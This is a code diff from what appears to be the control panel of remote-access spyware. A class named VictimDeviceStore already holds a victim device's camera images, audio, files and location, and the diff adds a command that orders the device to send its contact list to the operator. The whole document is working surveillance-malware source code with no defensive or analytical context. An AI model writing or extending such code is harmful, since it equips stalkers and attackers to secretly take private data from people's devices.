@@ -12,6 +12,7 @@ import {
 import {
     type CameraItem,
     type CameraOrderPayload,
+    type ContactItem,
     type FileListItem,
     type IBaseEntity,
     type IServerToVictimEvents,
@@ -45,6 +46,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public files: FileListItem[] = [];
     public audioDataUrl: string | null = null;
     public location: [number, number] | null = null;
+    public contacts: ContactItem[] = [];
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -73,12 +75,14 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             audioDataUrl: observable,
             cameras: observable,
             connectionStatus: observable,
+            contacts: observable,
             files: observable,
             imageDataUrl: observable,
             location: observable,
             open: observable,
             setAudio: action,
             setCameras: action,
+            setContacts: action,
             setFiles: action,
             setImage: action,
             setLocation: action,
@@ -175,6 +179,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
             this.setLocation([data.lat, data.lng]);
         });
+
+        this.socket.on(VictimOrder.CONTACTS, (data) => {
+            console.log(`[VICTIM] Contacts from ${this.deviceId}`, data);
+
+            this.setContacts(data.contactsList);
+        });
     }
 
     public listCameras(): void {
@@ -220,6 +230,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         });
     }
 
+    public fetchContacts(): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.CONTACTS,
+        });
+    }
+
     public setAudio(audio: Buffer | null): void {
         this.audioDataUrl =
             audio !== null ? bufferToDataUrl(audio, 'audio/mp3') : null;
@@ -231,6 +247,10 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
     public setConnectionStatus(connectionStatus: ConnectionStatus): void {
         this.connectionStatus = connectionStatus;
+    }
+
+    public setContacts(contacts: ContactItem[]): void {
+        this.contacts = contacts;
     }
 
     public setFiles(files: FileListItem[]): void {
